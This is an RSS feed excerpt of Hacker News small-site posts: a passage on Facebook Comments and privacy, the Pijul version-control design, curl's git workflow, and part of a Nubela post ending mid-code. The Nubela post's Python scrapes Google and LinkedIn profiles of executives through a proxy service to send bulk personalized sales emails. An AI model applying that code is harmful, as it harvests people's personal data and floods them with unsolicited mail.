<p>According to an estimation by&nbsp;<a href="https://www.similartech.com/technologies/facebook-comments">Similartech</a>&nbsp;more than 360,000 unique domains have installed Facebook Comments plugin. It is still not clear why and how the spam filters of Facebook failed to filter spam comments. <a href="https://www.similartech.com/technologies/facebook-comments">In 2015</a>, one of the security firms, Symantec reported scammers had been trying to affect the comments sections of Facebook to spread malware. </p>
<p>For more than two years now, Facebook has been working on its content-moderation efforts and the spamming in Facebook Comment boxes shows that problematic content still finds its way to escape the loopholes. Moreover, <a href="https://www-dailymail-co-uk.cdn.ampproject.org/v/s/www.dailymail.co.uk/sciencetech/article-2525227/amp/Facebook-tracks-type-DONT-post-update-comment.html?amp_js_v=a6&amp;amp_gsa=1&amp;usqp=mq331AQFKAGwASA%3D#aoh=16034519192504&amp;referrer=https%3A%2F%2Fwww.google.com&amp;amp_tf=From%20%251%24s&amp;ampshare=https%3A%2F%2Fwww.dailymail.co.uk%2Fsciencetech%2Farticle-2525227%2FFacebook-tracks-type-DONT-post-update-comment.html">Facebook can track what </a><a href="https://www-dailymail-co-uk.cdn.ampproject.org/v/s/www.dailymail.co.uk/sciencetech/article-2525227/amp/Facebook-tracks-type-DONT-post-update-comment.html?usqp=mq331AQFKAGwASA%3D&amp;amp_js_v=0.1#aoh=16034519192504&amp;referrer=https%3A%2F%2Fwww.google.com&amp;amp_tf=From%20%251%24s&amp;ampshare=https%3A%2F%2Fwww.dailymail.co.uk%2Fsciencetech%2Farticle-2525227%2FFacebook-tracks-type-DONT-post-update-comment.html">you</a><a href="https://www-dailymail-co-uk.cdn.ampproject.org/v/s/www.dailymail.co.uk/sciencetech/article-2525227/amp/Facebook-tracks-type-DONT-post-update-comment.html?amp_js_v=a6&amp;amp_gsa=1&amp;usqp=mq331AQFKAGwASA%3D#aoh=16034519192504&amp;referrer=https%3A%2F%2Fwww.google.com&amp;amp_tf=From%20%251%24s&amp;ampshare=https%3A%2F%2Fwww.dailymail.co.uk%2Fsciencetech%2Farticle-2525227%2FFacebook-tracks-type-DONT-post-update-comment.html"> type</a>, even if you never post it.&nbsp;Data scientists can determine that a status or comment has been typed by tracking code in the HTML form element of each page.</p>
<h2>Read The Terms and Conditions</h2>
<p>We live in a world where the concept of privacy already seems outdated. But that is largely because we’ve decided not to inquire about what happens when we trade it for convenience. The more connected you, and billions of others, are to Facebook, the more money Facebook makes by selling your personal information, and the more powerful it becomes.</p>
<p>The terms of service state,&nbsp;<em>We use the data we have — for example, about the connections you make, the choices and settings you select, and what you share and do on and off our Products — to personalize your experience.</em></p>
<figure><img loading="lazy" width="746" height="634" src="https://talk.hyvor.com/blog/wp-content/uploads/2020/10/DcrJMbSW0AAxJXC.jpg" alt="" srcset="https://talk.hyvor.com/blog/wp-content/uploads/2020/10/DcrJMbSW0AAxJXC.jpg 746w, https://talk.hyvor.com/blog/wp-content/uploads/2020/10/DcrJMbSW0AAxJXC-300x255.jpg 300w" sizes="(max-width: 746px) 100vw, 746px" data-srcset="https://talk.hyvor.com/blog/wp-content/uploads/2020/10/DcrJMbSW0AAxJXC.jpg 746w, https://talk.hyvor.com/blog/wp-content/uploads/2020/10/DcrJMbSW0AAxJXC-300x255.jpg 300w" data-src="https://talk.hyvor.com/blog/wp-content/uploads/2020/10/DcrJMbSW0AAxJXC.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption><a href="https://qz.com/1266835/facebooks-terms-of-service-translated-so-you-understand-your-data-and-privacy-settings/">Be wary of nebulous terms and promises</a></figcaption></figure>
<p>Basically, this means that Facebook uses every bit of personal information it can, collected&nbsp;<a href="https://www.consumerreports.org/privacy/how-facebook-tracks-you-even-when-youre-not-on-facebook/">both on and off Facebook</a>, to entice advertisers. The better the company knows you through the personal information you share with your friends and family, the more likely they are to be able to sell you stuff you want.</p>
<h2>Choose The Right to Privacy</h2>
<p>Big data is big business and value is created from customer insight. But, where is the moral line? What happens when companies cross that line? What if consumers could flip the equation to offer their data directly to the companies they trust? The future could be customer-monetized data.</p>
<p>We are the authors of our own destruction here since we don’t choose to be aware. If you participate in Facebook, should you not have some semblance of an expectation of privacy. The former Federal Trade Commission Chairperson Jon Leibowitz publicly stated, “We all agree that consumers don’t read privacy policies.”</p>
<p><a href="https://talk.hyvor.com/docs/gdpr">Ensure you choose privacy</a> and are aware of how technology plans on using your data. The only solution is being non-participatory. The solution is choosing not to be part of a pernicious agenda that can be defined as Surveillance Capitalism. </p>
<div><div><div><h4>
Need a privacy-focused commenting platform for your website?
</h4>

</div></div></div> </div></div>]]>
            </description>
            <link>https://talk.hyvor.com/blog/privacy-and-big-data/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25033030</guid>
            <pubDate>Mon, 09 Nov 2020 09:37:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pijul: Towards 1.0]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25032956">thread link</a>) | @lelf
<br/>
November 9, 2020 | https://pijul.org/posts/2020-11-07-towards-1.0/ | <a href="https://web.archive.org/web/*/https://pijul.org/posts/2020-11-07-towards-1.0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
            <div>
                <div>


<p>Saturday, November 7, 2020</p>
<p>After fixing the performance and scalability problems, we’re on our way to getting a stable Pijul. In this post, I explain what I’ve been up to in the recent months.</p>
<h2 id="context">Context</h2>
<p>Pijul has always been advertised as a research project, trying to implement a theory of patches that would be sound and fast. This is an ambitious goal, and became even more ambitious than initially envisioned.</p>
<p>One of the hardest challenges is that source code is by essence stateful, which makes it much harder to iterate over algorithm designs, like normal research projecst need to. For example, in order to get from our last published version to our current design, we have gone through many different variants, and there wasn’t much to publish.</p>
<p>Moreover, the UX aspect is what matters most in the end, and testing it on a real world project is the only way to get it there. However, unlike in a compiler, where bootstrapping is done one step at a time, and previous versions are always available to compile your current one, a version control system has the additional problem that the previous versions might not always be easily accessible if there is a bug.</p>
<p>One of the criticisms I’ve heard since I realised that better datastructures were possible is that I was “working secretely”. I certainly understand this feeling, but this is based on a misunderstanding of how research works. When I first had the idea that I’m explaining in this post, I realised that a complete rewrite would be needed. But for a very long time, almost nothing other than unusable, unreadable prototypes happened.</p>
<p>Back then, there wasn’t much to show, since it wasn’t even clear that the basic datastructure would work. And even when they started working at a large enough scale, it took me quite a bit of testing on large repositories before they started actually working.</p>
<p>This also implies that there wasn’t much to show for quite a while, since the new algorithm wasn’t usable until very recently, and any repository started before now would have become obsolete in a matter of days.</p>
<p>There were also <a href="#a-personal-note">persoprofessional reasons</a> for this silence, described at the end of this post.</p>

<p>Pijul depends on two other projects I’ve started.</p>
<h3 id="sanakirja">Sanakirja</h3>
<p>One of these projects is Sanakirja, which is “just” a key-value store, but has the extra feature that databases can be cloned efficiently. I would have loved to just use an existing library, but there just isn’t any that has this cloning feature. However, the scope of Sanakirja is still quite modest, it does one thing and does it well. Obviously, it took some time to find the memory-management bugs, but I have good confidence that this is now done.</p>
<p>In previous releases of Pijul, databases were implemented with a single mmapped file containing the binary representation of B Trees. Despite their lower writing performance (compared to alternatives such as <em>Log-structured merge-trees</em>), and the complexity of the code for deletions, B Trees are very well suited to this use case: indeed, since they are trees, reference-counting the nodes is enough to implement efficient clones.</p>
<p>One of the remaining issues was that in order to grow the database, we needed to un-mmapped the file, grow it, and mmap it again. Since applying a single change in Pijul must be an atomic operation, we needed to cancel the transaction when that happened, and restart it with a bigger file.</p>
<p>Another issue is that I wanted the next libpijul to compile on platforms that don’t have mmap, such as WASM. However, if reallocating an mmapped file has a very low complexity (even though it does have a non-zero cost in terms of system calls), reallocating a chunk of memory often requires copying everything. This completely defeats the point of the algorithms in Pijul, which rely on a particular representation of the datastructures on the disk.</p>
<p>The main innovation in Sanakirja 0.13 is to use a vector of memory blocks (either in memory or mmapped from a file), of exponentially-increasing size. The overhead is just one extra indirection, the complexity of adding items is the same (since the operation of creating an extra block is $O(1)$). The exponentially-increasing sizes mean that the allocated memory is always at least half-full.</p>
<h3 id="thrussh">Thrussh</h3>
<p>The other one is Thrussh. That library implements the SSH protocol, and tries to handle a number of key formats. The former is a surprisingly easy goal, and keeping up with Tokio versions has historically been the hardest bit, while the latter is the most horrendous hydra-like task, with new heads and legacy formats showing up every time you think you’re done.</p>
<h2 id="how-repositories-used-to-work-and-still-do-to-some-extent">How repositories used to work (and still do, to some extent)</h2>
<p>Old-style repositories represented a single file by a directed graph $G = (V, E)$ of lines, where each vertex $v\in V$ represented a line, and an edge from $u \in V$ to $v\in V$, labelled by some change (also called patch) number $c$, could be read as “according to change $c$, line $u$ comes before $v$”.</p>
<p>This means that changes could introduce vertices and lines, as in the following example, where a line $D$ is introduced between $A$ and $B$:</p>
<p><img src="https://pijul.org/img/repos-line-add.svg">
</p>
<p>Here, the thick line represents the change from the file containing the lines $A$, $B$, $C$ to the file with the new line $D$.
An important feature to note is that <strong>vertices are uniquely identified</strong>, by the hash of the change that introduced them, along with a position in that change. This means that two lines with the same content, introduced by different changes, will be different. It also means that a lines keeps its identity, even if the change is applied in a totally different context.</p>
<p>Moreover, this system is append-only, in the sense that <em>deletions</em> are handled by a more sophisticated labelling of the edges. In the example above, if we want to delete line $D$, we just need to make a change mapping the edge introduced by $c_0$ to a deleted edge, which we label by the name $c_1$ of the change that introduces it:</p>
<p><img src="https://pijul.org/img/repos-line-del.svg">
</p>
<p>From now on, we call the full edges <strong>alive</strong>, and the dashed ones <strong>dead</strong>.</p>
<p>We have just described the two basic kinds of actions in Pijul. There are no other. One kind adds vertices to the graph, along with “alive” edges around them, and the other kind maps an existing edge label onto a different one.
In order to fully described the system, I also need to mention that the edge labels are given by two parameters: their status (alive, deleted, and a few others related to multiple files and technical details explained below) and the change that introduced them.</p>
<h3 id="dependencies">Dependencies</h3>
<p>This scheme allows to defines dependencies between changes:</p>
<ul>
<li>
<p>If a change $c$ adds a vertex, we must have its <em>“context”</em>, i.e. the lines before and after it, hence the changes that introduced these lines are in the dependencies of $c$.</p>
</li>
<li>
<p>If a change $c$ deletes a vertex, or in other words maps an existing edge introduced by a change $d$, then $c$ must depend on $d$.</p>
</li>
</ul>
<p>Of course, this is just the minimal set of dependencies needed to make sense of the text edits. Hooks and scripts may add extra language-dependent dependencies based on semantics.</p>
<h3 id="are-edge-labels-minimal">Are edge labels minimal?</h3>
<p>Our goals is to find the smallest possible system, both for reasons of mathematical aesthetics (why store useless stuff?) and the other one for performance. Therefore, one immediate question comes to mind: why even keep the change number on the edges?</p>
<p>In order to answer that question, suppose we don’t keep the labels, meaning that the maps happen between statuses only. Then, consider the following two situations:</p>
<ul>
<li>
<p><strong>Change inverses</strong></p>
<p>The first issue happens when two authors delete a line in parallel, and one of the authors reverts their change. Applying these changes yields the following diagram, where the two deletions get merged into one, and the inverse applies to both:</p>
 <p><img src="https://pijul.org/img/inverse2.svg">
 </p>
<p>However, this is not what we expect, since one of the authors explicitly reverted the deletion, while the other performed the same deletion in parallel.
By keeping the labels, this is what we get instead:</p>
 <p><img src="https://pijul.org/img/inverse3.svg">
 </p>
</li>
<li>
<p><strong>Missing contexts</strong></p>
<p>For the sake of clarity, in the rest of this post, we name two users Alice (with pronouns “she/her”) and Bob (with pronouns “he/his”).</p>
<p>This situation, where Alice writes something in the middle of a paragraph $p$, while Bob deletes $p$ in parallel.
One issue here, is that the situation is not symmetric: when Bob applies Alice’s change, he can tell immediately that something is wrong, because the context of Alice’s edits is labelled as deleted in his repository.</p>
 <p><img src="https://pijul.org/img/known-vertices1.svg">
 </p>
<p>However, Alice’s situation is different: indeed, consider the case where instead of deleting $p$ <em>in parallel</em> of her changes, Bob deleted $p$ after applying Alice’s change. The edges deleted are exactly the same, but this is not a conflict, as shown in the following diagram:</p>
 <p><img src="https://pijul.org/img/known-vertices2.svg">
 </p>
<p>The situation is further complicated by the fact that this system doesn’t behave symmetrically with the contexts above and below the new line. Indeed, if Bob deleted the <em>down context</em> of the line (i.e. if he deleted line $C$) instead of the <em>up context</em> (line $B$), Alice could detect the conflict, since in that case, $C$ would have both an alive and a dead edge pointing to it ($C$ is called a “zombie vertex” internally), as shown in the following diagram:</p>
 <p><img src="https://pijul.org/img/known-vertices0.svg">
 </p>
<p>Keeping the change identifiers on each edge allows us to solve this. In Pijul 0.12, Bob would add the labels of all the edges around the deleted lines to the dependencies of his change. Then, Alice can tell whether Bob knows of her change before applying it. The changes are conflict if and only if Bob doesn’t know of the new lines.</p>
<p>However, this behaviour was counter-intuitive, <a href="https://discourse.pijul.org/t/why-these-patches-dont-commute/449">as noted by @tae</a>.</p>
<p>A finer analysis of what dependencies are led to a different behaviour in the new Pijul. Changes now have two different sets of dependencies: one is the set of strict dependencies, which are change we require in order to apply the current change, while the other one is merely a set of “known” changes, which the apply …</p></li></ul></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pijul.org/posts/2020-11-07-towards-1.0/">https://pijul.org/posts/2020-11-07-towards-1.0/</a></em></p>]]>
            </description>
            <link>https://pijul.org/posts/2020-11-07-towards-1.0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25032956</guid>
            <pubDate>Mon, 09 Nov 2020 09:24:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[This is how I Git]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25032951">thread link</a>) | @stargrave
<br/>
November 9, 2020 | https://daniel.haxx.se/blog/2020/11/09/this-is-how-i-git/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/11/09/this-is-how-i-git/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Every now and then I get questions on how to work with git in a smooth way when developing, bug-fixing or extending curl – or how I do it. After all, I <a href="https://daniel.haxx.se/blog/2020/10/26/working-open-source/" data-type="post" data-id="14901">work on open source full time</a> which means I have very frequent interactions with git (and GitHub). Simply put, I work with git all day long. Ordinary days, I issue git commands several hundred times.</p>



<p>I have a very simple approach and way of working with git in curl. This is how it works.</p>



<h2>command line</h2>



<p>I use git almost exclusively from the command line in a terminal. To help me see which branch I’m working in, I have this little bash helper script.</p>



<pre>brname () {
  a=$(<code>git rev-parse --abbrev-ref HEAD 2&gt;/dev/null</code>)
  if [ -n "$a" ]; then
    echo " [$a]"
  else
    echo ""
  fi
}
PS1="\u@\h:\w\$(brname)$ "</pre>



<p>That gives me a prompt that shows username, host name, the current working directory and the current checked out git branch.</p>



<p>In addition: I use Debian’s <a href="https://salsa.debian.org/debian/bash-completion/-/blob/master/README.md">bash command line completion</a> for git which is also really handy. It allows me to use tab to complete things like git commands and branch names. </p>



<h2>git config</h2>



<p>I of course also have my customized <code>~/.gitconfig</code> file to provide me with some convenient aliases and settings. My most commonly used git aliases are:</p>


<pre title="">st = status --short -uno
ci = commit
ca = commit --amend
caa = commit -a --amend
br = branch
co = checkout
df = diff
lg = log -p --pretty=fuller --abbrev-commit
lgg = log --pretty=fuller --abbrev-commit --stat
up = pull --rebase
latest = log @^{/RELEASE-NOTES:.synced}..
</pre>


<p>The ‘latest’ one is for listing all changes done to curl since the most recent RELEASE-NOTES “sync”. The others should hopefully be rather self-explanatory.</p>



<p>The config also sets <code>gpgsign = true</code>, enables mailmap and a few other things.</p>



<h2>master is clean and working</h2>



<p>The main curl development is done in the single <a href="https://github.com/curl/curl">curl/curl</a> git repository (primarily hosted on GitHub). We keep the master branch the bleeding edge development tree and we work hard to always keep that working and functional. We do our releases off the master branch when that day comes (every eight weeks) and we provide “<a href="https://curl.haxx.se/snapshots/">daily snapshots</a>” from that branch, put together – yeah – daily.</p>



<p>When merging fixes and features into master, we avoid merge commits and use rebases and fast-forward as much as possible. This makes the branch very easy to browse, understand and work with – as it is 100% linear.</p>



<h2>Work on a fix or feature</h2>



<p>When I start something new, like work on a bug or trying out someone’s patch or similar, I first create a local branch off master and work in that. That is, I don’t work directly in the master branch. Branches are easy and quick to do and there’s no reason to shy away from having loads of them!</p>



<p>I typically name the branch prefixed with my GitHub user name, so that when I push them to the server it is noticeable who is the creator (and I can use the same branch name locally as I do remotely).</p>



<pre>$ git checkout -b bagder/my-new-stuff-or-bugfix</pre>



<p>Once I’ve reached somewhere, I commit to the branch. It can then end up one or more commits before I consider myself “done for now” with what I was set out to do.</p>



<p>I try not to leave the tree with any uncommitted changes – like if I take off for the day or even just leave for food or an extended break. This puts the repository in a state that allows me to easily switch over to another branch  when I get back – should I feel the need to. Plus, it’s better to commit and explain the change <em>before</em> the break rather than having to recall the details again when coming back.</p>



<h2>Never stash</h2>



<p>“git stash” is therefore not a command I ever use. I rather create a new branch and commit the (temporary?) work in there as a potential new line of work.</p>



<h2>Show it off and get reviews</h2>



<p>Yes I am the lead developer of the project but I still maintain the same work flow as everyone else. All changes, except the most minuscule ones, are done as pull requests on GitHub.</p>



<p>When I’m happy with the functionality in my local branch. When the bug seems to be fixed or the feature seems to be doing what it’s supposed to do and the test suite runs fine locally.</p>



<p>I then clean up the commit series with “<code>git rebase -i</code>” (or if it is a single commit I can instead use just “<code>git commit --amend</code>“).</p>



<p>The commit series should be a set of logical changes that are related to this change and not any more than necessary, but kept separate if they are separate. Each commit also gets its own proper commit message. Unrelated changes should be split out into its own separate branch and subsequent separate pull request.</p>



<pre>git push origin bagder/my-new-stuff-or-bugfix</pre>



<h2>Make the push a pull request</h2>



<p>On GitHub, I then make the newly pushed branch into a <a href="https://github.com/curl/curl/pulls">pull request</a> (aka “a PR”). It will then become visible in the list of pull requests on the site for the curl source repository, it will be announced in the #curl IRC channel and everyone who follows the repository on GitHub will be notified accordingly.</p>



<p>Perhaps most importantly, a pull request kicks of a flood of CI jobs that will build and test the code in numerous different combinations and on several platforms, and the results of those tests will trickle in over the coming hours. When I write this, we have around 90 different CI jobs – per pull request – and something like 8 different code analyzers will scrutinize the change to see if there’s any obvious flaws in there.</p>



<figure><a href="https://daniel.haxx.se/blog/wp-content/uploads/2020/11/Screenshot_2020-11-05-curl-Project-status-dashboard.png"><img loading="lazy" width="2686" height="1510" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/11/Screenshot_2020-11-05-curl-Project-status-dashboard.png" alt=""></a><figcaption>CI jobs per platform over time. Graph snapped on November 5, 2020</figcaption></figure>



<h2>A branch in the actual curl/curl repo</h2>



<p>Most contributors who would work on curl would not do like me and make the branch in the curl repository itself, but would rather do them in their own forked version instead. The difference isn’t that big and I <em>could</em> of course also do it that way.</p>



<h2>After push, switch branch</h2>



<p>As it will take some time to get the full CI results from the PR to come in (generally a few hours), I switch over to the next branch with work on my agenda. On a normal work-day I can easily move over ten different branches, polish them and submit updates in their respective pull-requests.</p>



<p>I can go back to the&nbsp;master branch again with ‘<code>git checkout master</code>‘ and there I can “<code>git pull</code>” to get everything from upstream – like when my fellow developers have pushed stuff in the mean time.</p>



<h2>PR comments or CI alerts</h2>



<p>If a reviewer or a CI job find a mistake in one of my PRs, that becomes visible on GitHub and I get to work to handle it. To either fix the bug or discuss with the reviewer what the better approach might be.</p>



<p>Unfortunately, flaky CI jobs is a part of life so very often there ends up one or two red markers in the list of CI jobs that can be ignored as the test failures in them are there due to problems in the setup and not because of actual mistakes in the PR…</p>



<p>To get back to my branch for that PR again, I “<code>git checkout bagder/my-new-stuff-or-bugfix</code>“, and fix the issues.</p>



<p>I normally start out by doing follow-up commits that repair the immediate mistake and push them on the branch:</p>



<pre>git push origin <code>bagder/my-new-stuff-or-bugfix</code></pre>



<p>If the number of fixup commits gets large, or if the follow-up fixes aren’t small, I usually end up doing a squash to reduce the number of commits into a smaller, simpler set, and then force-push them to the branch.</p>



<p>The reason for that is to make the patch series easy to review, read and understand. When a commit series has too many commits that changes the previous commits, it becomes hard to review.</p>



<h2>Ripe to merge?</h2>



<p>When the pull request is ripe for merging (independently of who authored it), I switch over to the master branch again and I merge the pull request’s commits into it. In special cases I cherry-pick specific commits from the branch instead. When all the stuff has been yanked into master properly that should be there, I push the changes to the remote.</p>



<p>Usually, and especially if the pull request wasn’t done by me, I also go over the commit messages and polish them somewhat before I push everything. Commit messages should follow our style and mention not only which PR that it closes but also which issue it fixes and properly give credit to the bug reporter and all the helpers – using the right syntax so that our automatic tools can pick them up correctly!</p>



<p>As already mentioned above, I merge fast-forward or rebased into master. No merge commits.</p>



<h2>Never merge with GitHub!</h2>



<p>There’s a button GitHub that says “rebase and merge” that could theoretically be used for merging pull requests. I <em>never</em> use that (and if I could, I’d disable/hide it). The reasons are simply:</p>



<ol><li>I don’t feel that I have the proper control of the commit message(s)</li><li>I can’t select to squash a subset of the commits, only all or nothing</li><li>I often want to cleanup the author parts too before push, which the UI doesn’t allow</li></ol>



<p>The downside with not using the merge button is that the message in the  PR says “closed by [hash]” instead of “merged in…” which causes confusion to a fair amount of users who don’t realize it means that it actually means the same thing! I consider this is a (long-standing) GitHub UX flaw.</p>



<h2>Post merge</h2>



<p>If the branch has nothing to be kept around more, I delete the local branch again with “<code>git branch -d [name]</code>” and I remove it remotely too since it was completely merged there’s no reason to keep the work version left.</p>



<p>At any given point in time, I have some 20-30 different local branches alive using this approach so things I work on over time all live in their own branches and also submissions from various people that haven’t been merged into master yet exist in branches of various maturity levels. Out of those local branches, the number of concurrent pull requests I have in progress can be somewhere between just a few up to ten, twelve something.</p>



<h2>RELEASE-NOTES</h2>



<p>Not strictly related, but in order to keep interested people informed about what’s happening in the tree, we sync the <a href="https://github.com/curl/curl/blob/master/RELEASE-NOTES">RELEASE-NOTES</a> file every once in a while. Maybe every 5-7 days or so. It …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://daniel.haxx.se/blog/2020/11/09/this-is-how-i-git/">https://daniel.haxx.se/blog/2020/11/09/this-is-how-i-git/</a></em></p>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/11/09/this-is-how-i-git/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25032951</guid>
            <pubDate>Mon, 09 Nov 2020 09:23:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Programmatically perform personalized sales out-reach to Fortune 500 companies]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25032865">thread link</a>) | @nubela
<br/>
November 9, 2020 | https://nubela.co/blog/send-personalized-emails-to-decision-makers-scrape-linkedin-company-profile/ | <a href="https://web.archive.org/web/*/https://nubela.co/blog/send-personalized-emails-to-decision-makers-scrape-linkedin-company-profile/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://accountgram-production.sfo2.cdn.digitaloceanspaces.com/nubelaco_ghost/2020/11/TLC_How_I_sent_personalized_emails_with_25_follow-ups_to_decision_makers_of_200_Fortune_500_companies_light_bg.png 300w,
                            https://accountgram-production.sfo2.cdn.digitaloceanspaces.com/nubelaco_ghost/2020/11/TLC_How_I_sent_personalized_emails_with_25_follow-ups_to_decision_makers_of_200_Fortune_500_companies_light_bg.png 600w,
                            https://accountgram-production.sfo2.cdn.digitaloceanspaces.com/nubelaco_ghost/2020/11/TLC_How_I_sent_personalized_emails_with_25_follow-ups_to_decision_makers_of_200_Fortune_500_companies_light_bg.png 1000w,
                            https://accountgram-production.sfo2.cdn.digitaloceanspaces.com/nubelaco_ghost/2020/11/TLC_How_I_sent_personalized_emails_with_25_follow-ups_to_decision_makers_of_200_Fortune_500_companies_light_bg.png 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 700px,
                            1400px" src="https://accountgram-production.sfo2.cdn.digitaloceanspaces.com/nubelaco_ghost/2020/11/TLC_How_I_sent_personalized_emails_with_25_follow-ups_to_decision_makers_of_200_Fortune_500_companies_light_bg.png" alt="How to programmatically send personalized emails to 200 decision makers of Fortune 500 companies (with code samples)">
</figure>
<section>
<div>
<h2 id="i-want-to-close-bigger-deals-by-reaching-decision-makers-directly">I want to close bigger deals by reaching decision-makers directly</h2><p>I am the founder of Nubela. I lead sales for Proxycurl, and I do this alone. So it is vital that whatever I do is leveraged and effective. Luckily, I can code.<br>I figured that general emails do not get to decision-makers in large(r) companies, and I want to move up the value chain. I want to close bigger deals. I think I can achieve that by reaching decision-makers directly and with emails personalized with a unique problem-solution statement for their company. To say, I want to do what other sales reps are doing and more.<br>To be very specific, I want to reach 200 decision-makers at a single burst. I want to send 25 personalized follow-ups per decision-maker.<br>In this blog post, I will share how I accomplished this with code.</p><h2 id="getting-a-list-of-companies-with-crunchbase-pro">Getting a list of companies with Crunchbase Pro</h2><p>I want to target larger companies that have the budget to purchase Proxycurl to build data-driven products. In particular, I have shortlisted companies that belong to the likes of sales automation tools, job boards, and talent sourcing companies to be our target market. Crunchbase Pro is excellent for building a list like such.</p><p>With Crunchbase Pro, I started a Company Search for a list of companies that</p><ol><li>matched Proxycurl's target industries</li><li>have revenues that are more than 5+M per annum</li></ol><p>Then, I exported the search results into a CSV file, ensuring that I have a column of data that includes the company's Linkedin Profile.</p><p>Once I have the list, I want to enrich the data with company names and their corresponding corporate website. This is the Python script I used to enrich data for the list of companies I had exported from Crunchbase Pro:</p><pre><code>async def get_company(company_profile_url: str):
    api_endpoint = f'{PROXYCURL_HOST}/api/linkedin/company'
    header_dic = {'Authorization': 'Bearer ' + PROXYCURL_API_KEY}

    for _ in range(RETRY_COUNT):
        try:
            async with httpx.AsyncClient() as client:
                r = await client.get(api_endpoint,
                                     params={'url': company_profile_url},
                                     headers=header_dic,
                                     timeout=PROXYCURL_XHR_DEFAULT_TIMEOUT)
                assert r.status_code == 200
                return r.json()
        except:
            continue

    return None


async def enrich_companies(lis):
    for profile_url in lis:
        coy = await get_company(profile_url)
        if coy is None:
            return None
        website = coy.get('website', None)
        coy_name = coy.get('name', None)

        # todo - (task for reader) save `website` and `coy_name` in a file
</code></pre>
<h2 id="find-decision-makers-with-proxycurl-api">Find decision makers with Proxycurl API</h2><p>Now that I have companies, I need decision-makers. Decision-makers in this exercise mean people in the roles of CEO, COO, CTO, and VP of Product.</p><p>To accomplish this, I will search for them on Google. For example, if I want to find the Linkedin profile of the CEO of Cognism, I will enter the following search phrase in Google:</p><blockquote>linkedin.com/in ceo cognism</blockquote><p>Chances are, the correct profile will be in the search result. I will then repeat the query with different roles till I have a list of profiles. And it works.</p><p>To perform Google searches at scale, I will use Proxycurl's <a href="https://nubela.co/proxycurl/docs#crawling-other-pages">"Crawling other pages" endpoint</a>. This is how I programmatically make Google Search queries with Proxycurl:</p><pre><code>async def google_search_async(search_term, retry_count=5) -&gt; List[str]:
    """
    Perform a Google Search via Overlord and return a list of results in terms of URLs in the first page.
    """
    for _ in range(retry_count):
        try:
            search_url = f"https://www.google.com/search?q={quote(search_term)}"
            payload = {'url': search_url,
                       "type": 'xhr',
                       }

            async with httpx.AsyncClient() as client:
                r = await client.post(f"{OVERLORD_ENDPOINT}/message",
                                      auth=(OVERLORD_USERNAME,
                                            OVERLORD_PASSWD),
                                      json=payload,
                                      timeout=PROXYCURL_XHR_DEFAULT_TIMEOUT)
                if r.status_code != 200:
                    print(
                        f"Google search failed with {r.status_code}, retrying.")
                assert r.status_code == 200

            html_src = r.json()['data']
            soup = BeautifulSoup(html_src, features="html.parser")
            result_lis = soup.select(".g a[ping]")
            href_lis = []
            for result in result_lis:
                href = result['href']
                if '//webcache.googleusercontent.com/search' in href:
                    continue
                if 'https://translate.google.com/translate' in href:
                    continue
                href_lis += [href]
            if len(href_lis) == 0:
                continue
            return href_lis
        except:
            traceback.print_exc()
            continue
    raise Exception
</code></pre>
<p>However, my computer is not smart enough to understand when a CEO is the same as "Chief Executive Officer." Or that "Engineering Head" and "Chief Engineering" are very much alike. For that, I have an algorithm which I call <code>is_string_similar()</code>. You can find the algorithm to check if two strings are similar <a href="https://giki.wiki/@nubela/Software-Engineering/similar-string">here</a>.</p><p>Once I have a list of Linkedin profiles, I need to ensure that:</p><ol><li>The profile's current employment belongs to the company that I am googling for (Google gets this wrong sometimes)</li><li>The profile's current role at the company matches the decision making roles.</li></ol><p>To perform the checks above, I will:</p><ol><li>Enrich the Linkedin profiles with <a href="https://nubela.co/proxycurl/docs#linkedin-person-profile-endpoint">Proxycurl's Person Profile Endpoint</a> to get the profile's list of experiences.</li><li>Verify that his/her active employment matches up.</li></ol><p>This is how I accomplish the above in Python code:</p><pre><code>async def get_person_profile(profile_url):
    api_endpoint = f'{PROXYCURL_HOST}/api/v2/linkedin'
    header_dic = {'Authorization': 'Bearer ' + PROXYCURL_API_KEY}

    for _ in range(RETRY_COUNT):
        try:
            async with httpx.AsyncClient() as client:
                r = await client.get(api_endpoint,
                                     params={'url': profile_url},
                                     headers=header_dic,
                                     timeout=PROXYCURL_XHR_DEFAULT_TIMEOUT)
                if r.status_code == 404:
                    return None
                assert r.status_code == 200
                return r.json()
        except:
            continue

    print(f"{profile_url} retried {RETRY_COUNT} times but still failing")
    return None


async def google_search_async(search_term, retry_count=3) -&gt; List[str]:
    """
    Perform a Google Search via Overlord and return a list of results in terms of URLs in the first page.
    """
    for _ in range(retry_count):
        try:
            search_url = f"https://www.google.com/search?q={quote(search_term)}"
            payload = {'url': search_url,
                       "type": 'xhr',
                       }

            async with httpx.AsyncClient() as client:
                r = await client.post(f"{OVERLORD_ENDPOINT}/message",
                                      auth=(OVERLORD_USERNAME,
                                            OVERLORD_PASSWD),
                                      json=payload,
                                      timeout=PROXYCURL_XHR_DEFAULT_TIMEOUT)
                if r.status_code != 200:
                    print(
                        f"Google search failed with {r.status_code}, retrying.")
                assert r.status_code == 200

            html_src = r.json()['data']
            soup = BeautifulSoup(html_src, features="html.parser")
